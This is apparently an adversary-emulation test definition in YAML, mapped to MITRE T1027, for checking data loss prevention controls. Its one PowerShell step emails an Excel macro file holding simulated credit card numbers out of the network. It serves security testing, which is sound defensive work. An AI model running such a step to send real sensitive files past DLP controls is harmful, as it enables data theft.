api_version: "2.0"
name: DLP Evasion via Sensitive Data in VBA Macro over email
description: |
    Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email.
    Sensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.
args:
    - name: input_file
      type: path
      default: PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
    - name: sender
      type: string
      default: test@corp.com
    - name: receiver
      type: string
      default: test@corp.com
    - name: smtp_server
      type: string
      default: 127.0.0.1
uuid: 129edb75-d7b8-42cd-a8ba-1f3db64ec4ad
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1027: Obfuscated Files or Information'
requirements:
    platforms:
        - os: windows
steps:
    - name: dlp-evasion-via-sensitive-data-in-vba-macro-over-email
      inline: |
        Send-MailMessage -From {{.Args.sender}} -To {{.Args.receiver}} -Subject 'T1027_Atomic_Test' -Attachments "{{.Args.input_file}}" -SmtpServer {{.Args.smtp_server}}
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
